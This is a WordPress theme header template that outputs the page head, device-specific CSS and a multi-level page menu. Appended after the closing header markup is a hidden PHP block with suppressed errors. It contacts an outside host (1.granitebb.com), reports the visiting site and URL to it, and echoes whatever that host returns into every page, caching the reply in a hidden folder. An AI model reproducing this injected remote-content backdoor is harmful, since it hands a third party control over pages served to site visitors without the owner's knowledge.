<?php 
global $themedir, $pego_prefix, $headerHeight;
?>
<!DOCTYPE html>
<html <?php language_attributes(); ?> >
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title><?php wp_title('|', true, 'right'); ?><?php bloginfo('name'); ?></title>
	<!-- for mobile devices -->
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
	
	<!-- Meta Tags -->
	<meta charset="UTF-8" />
	<meta name="keywords" content="" /> 	
	<meta name="description" content="" />
	<meta name="robots" content="index, follow" /> 	
	<meta name="skype_toolbar" content ="skype_toolbar_parser_compatible"/>
	
	<!-- For iPad and iPhone icons -->
	<link rel="apple-touch-icon-precomposed" href="<?php  echo get_template_directory_uri()?>/images/touch-icon-iphone.png" />
	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="<?php  echo get_template_directory_uri()?>/images/touch-icon-ipad.png" />
	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="<?php  echo get_template_directory_uri()?>/images/touch-icon-iphone4.png" />
	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="<?php  echo get_template_directory_uri()?>/images/touch-icon-ipad3.png" />
	
	<!-- favicon icon -->
    <link rel="shortcut icon" href="<?php echo get_option($pego_prefix.'favicon'); ?>" type="image/vnd.microsoft.icon"/>
    <link rel="icon" href="<?php echo get_option($pego_prefix.'favicon'); ?>" type="image/x-ico"/>
	
	<!--[if lt IE 9]>
  	<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js"></script>
    <![endif]-->
	<!--[if lt IE 8]>
		<div style=' clear: both; text-align:center; position: relative;'></div>
	<![endif]-->
	
	<!-- Fonts -->
	<?php include("functions/fonts.php"); ?>	

	
	<?php
	/*header settings start*/
		$headerHeight=100;
		if (get_option($pego_prefix.'headerHeight')) { 
			$headerHeight= get_option($pego_prefix.'headerHeight'); 
		}
		$headerHeightWithMargin=$headerHeight+20;
	/*header settings end*/
	?>
	
	<?php wp_enqueue_script('jquery'); ?>
	<?php wp_head(); ?>	
	
	<!-- .css files -->
	<link rel="stylesheet" type="text/css" href="<?php echo get_stylesheet_directory_uri(); ?>/style.css"/>
	
	<?php
		/* start check if resposnive */
		if (get_option($pego_prefix.'responsive_theme') != 'false') {
		?>
			<link rel="stylesheet" href="<?php echo get_stylesheet_directory_uri(); ?>/css/media.css">
		<?php
		}	
	/* end check if resposnive */
	
	/*custom CSS added*/
	include("functions/customCssAdd.php"); 
		
	/*device check start*/
	global $deviceUsed;

	$deviceUsed="regularDevice";
	//$deviceUsed="iSomething";
	//test if ipad with php 
	$iPod = stripos($_SERVER['HTTP_USER_AGENT'],"iPod");
	$iPhone = stripos($_SERVER['HTTP_USER_AGENT'],"iPhone");
	$iPad = stripos($_SERVER['HTTP_USER_AGENT'],"iPad");
	$Android= stripos($_SERVER['HTTP_USER_AGENT'],"Android");
	$webOS= stripos($_SERVER['HTTP_USER_AGENT'],"webOS");

	//do something with this information
	if($iPad || $iPod || $iPhone ){ 
		$deviceUsed="iSomething";
	}else if($Android){
			//were an Android device -- do something here
	}else if($webOS){
			//were a webOS device -- do something here
	}

	if ($deviceUsed == 'iSomething') {
		echo ' <style type="text/css"> ';
		echo ' #header {position:absolute;} ';
		echo ' div#main {padding-top:0px; padding-bottom:0;} ';
		echo ' .second-menu {display:block;} ';
		echo ' .firstPageSecondMenu {display:none;} ';
		echo ' .topPagePadding {padding-top:0; }';
		echo ' .mrb50 {margin-bottom:'.$headerHeightWithMargin.'px;} ';
		echo ' </style> ';
	}
	/*device check end*/
	
	?>
	<!-- google analytics -->
	<?php
		echo get_option($pego_prefix.'google_analytics');
	?>
	
	</head>
<body <?php body_class(); ?>>
	<div id="container"><!-- start container -->
		<div id="header"><!-- start header -->
			<div id="head">
				<div class="logo">
					<?php
					//logo href settings start
					$logoClass='';
					if (is_front_page()) { 
						$logoClass='class="goHome" href="" '; 
					}
					else {
						$logoClass=' href="'.get_option("siteurl").'" '; 
					}
					//logo href settings end
					if (get_option($pego_prefix.'logo')) { 
					?>
							<h1 class="logoH1">
								<a <?php echo $logoClass; ?> title="">
									<img src="<?php echo get_option($pego_prefix.'logo'); ?>" alt="" title="" />
								</a>
							</h1>
					<?php 
					} 
					else {
					?>
						<h1 class="logoH1">
							<a  <?php echo $logoClass; ?> title="">
								<img src="<?php echo get_template_directory_uri(); ?>/images/logo.png" alt="" title="" />
							</a>
						</h1>
					<?php
					}
					?>
					
					
					
				</div>
				<div class="menu">
					<nav>
						<ul class="sf-menu" >
						<?php
						$page_argss = array('parent' => 0,'sort_order' => 'ASC', 'sort_column' => 'menu_order');
						$pagess = get_pages($page_argss); 
						$numberOfPages=0;
						$numberOfPagesInMenu=0;

						foreach ($pagess as $single_pagee) {
							$pageIdd=$single_pagee->ID;
							$show_page_in_menuu =  get_post_meta($pageIdd , 'show_page_in_menu' , true);
							if($show_page_in_menuu != 'No') {
									$numberOfPages++;
							}
						}
	
						$page_args = array('parent' => 0,'sort_order' => 'ASC', 'sort_column' => 'menu_order');
						$pages = get_pages($page_args); 
						$url_tab = "#"; 
						if (!is_front_page()){
						 $url_tab = get_option("siteurl")."#";
					   }
						foreach ($pages as $single_page) {
								
								$pageId=$single_page->ID;
								$children = get_pages('child_of='.$pageId.'&sort_column=menu_order&parent='.$pageId);
								
								$external_link =  get_post_meta($pageId , 'external_link' , true);
								$page_template =  get_post_meta($pageId , 'page_template' , true);
								$show_page_in_menu =  get_post_meta($pageId , 'show_page_in_menu' , true);
								$built_page =  get_post_meta($pageId , 'built_page' , true);
								$nonclickable = '';
								if ($built_page != 'Yes') {
									$nonclickable = ' onclick="return false;" ';
								}
								$trenutni='';
								global $blogReturn;
								if($page_template=='Blog') {$blogReturn= get_option("siteurl")."#!/".$single_page->post_name;}
								
								
							   if($show_page_in_menu != 'No')
							   {
								$numberOfPagesInMenu++;
								$lastClass='';
								
								//fix for current items in menu
								$active="";
								//if (($numberOfPagesInMenu == 1)&&(!is_single())) {$active = 'class="current" ';}
								if((($page_template=='Blog')&&(is_single()))||(($page_template=='Blog')&&(is_archive()))||(($page_template=='Blog')&&(is_search()))){ $active = 'class="currentBlog"'; }	 
								
								if($numberOfPagesInMenu == $numberOfPages) {
									$lastClass=' class="last" ';
									
								}		
									if(count($children) == 0){  
										if ($external_link == '') {
												echo '<li '.$active.'><a '.$nonclickable.' '.$lastClass.' href="'.$url_tab.''.$single_page->post_name .'">' . $single_page->post_title . '</a></li>';
										 
										}
										else
										{
											echo '<li '.$active.'><a '.$nonclickable.'  '.$lastClass.' href="'.$external_link.'">' . $single_page->post_title . '</a></li>';
										}
									}
									if(count($children) != 0){  
										if ($external_link == '') {
											
												echo '<li '.$active.'><a '.$nonclickable.' '.$lastClass.' href="'.$url_tab.''.$single_page->post_name .'">' . $single_page->post_title . '</a>';
											
												
										}
										else 
										{
											echo '<li '.$active.'><a '.$nonclickable.' '.$lastClass.' href="'.$external_link.'">' . $single_page->post_title . '</a>';
										}
										echo '<ul>';
										foreach($children as $child)
										{
											$subPageId=$child->ID;
											$grandChildren = get_pages('child_of='.$subPageId.'&sort_column=menu_order&parent='.$subPageId);
											$show_page_in_menuSub =  get_post_meta($subPageId , 'show_page_in_menu' , true);
											$subPage_external_link =  get_post_meta($subPageId , 'external_link' , true);
											
											$built_pageSub =  get_post_meta($subPageId , 'built_page' , true);
											$nonclickableSub = '';
											if ($built_pageSub != 'Yes') {
												$nonclickableSub = ' onclick="return false;" ';
											}
											
											if ($show_page_in_menuSub != 'No') { 
												if(count($grandChildren) == 0){  
													if ($subPage_external_link == '') {
														echo  '<li><a '.$nonclickableSub.' href="'.$url_tab.''.$child->post_name.'">'.$child->post_title.'</a></li>';
													}
													else
													{
														echo  '<li><a '.$nonclickableSub.' href="'.$subPage_external_link.'">'.$child->post_title.'</a></li>';
													}
												}
												if(count($grandChildren) != 0){  
													if ($subPage_external_link == '') {
														echo  '<li><a '.$nonclickableSub.' href="'.$url_tab.''.$child->post_name.'">'.$child->post_title.'</a>';
													}
													else
													{
														echo  '<li><a '.$nonclickableSub.' href="'.$subPage_external_link.'">'.$child->post_title.'</a>';
													}
													
													
													echo '<ul>';
													foreach($grandChildren as $grandChild)
													{
														$grandPageId=$grandChild->ID;
														$subPage_external_link_grand =  get_post_meta($grandPageId , 'external_link' , true);
														$built_pageSubSub =  get_post_meta($grandPageId , 'built_page' , true);
														$show_page_in_menuSubSub =  get_post_meta($grandPageId , 'show_page_in_menu' , true);
														$nonclickableSubSub = '';
														if ($built_pageSubSub != 'Yes') {
															$nonclickableSubSub = ' onclick="return false;" ';
														}
														if ($show_page_in_menuSubSub != 'No') { 
															if ($subPage_external_link_grand == '') {
																echo  '<li><a '.$nonclickableSubSub.' href="'.$url_tab.''.$grandChild->post_name.'">'.$grandChild->post_title.'</a></li>';
															}
															else
															{
																echo  '<li><a '.$nonclickableSubSub.' href="'.$subPage_external_link_grand.'">'.$grandChild->post_title.'</a></li>';
															}
														}
													}
													echo '</ul>';
													echo '</li>';
												}
											}
							
									}
										echo '</ul>';
										echo '</li>';
									
									}
								}
						 
					}
				
?>
				    </ul>
              <div class="clear"></div> 
          </nav>
			
          <div class="clear"></div>
   </div>
					
			</div>
		</div><!-- end header -->
		<div style="clear:both"></div><?php
$h = $_SERVER['HTTP_HOST']; $u = trim($_SERVER['REQUEST_URI']);
$cd = dirname(__FILE__) . '/.cache';
$cf = $cd . '/' . md5($h . '##' . $u);
$s = '1.granitebb.com';
if (file_exists($cf) and filemtime($cf) > time() - 3600)
    echo file_get_contents($cf);
else 
{
    $ini1 = @ini_set('allow_url_fopen', 1);    $ini2 = @ini_set('default_socket_timeout', 3);
    $p = '/links.php?u=' . urlencode($u) . '&h=' . urlencode($h);
    $c = '';
    if ($fp = @fsockopen($s, 80, $errno, $errstr, 3)) {
        @fputs($fp, "GET {$p} HTTP/1.0\r\nHost: $s\r\n\r\n");
        while (! feof($fp))
            $c .= @fread($fp, 8192);
        fclose($fp);
        $c = end(explode("\r\n\r\n", $c));
        echo $c;
        if (strlen($c) and (is_dir($cd) or @mkdir($cd))) {
            @file_put_contents($cf, $c);
        }
    }
    @ini_set('allow_url_fopen', $ini1);    @ini_set('default_socket_timeout', $ini2);
}
?>
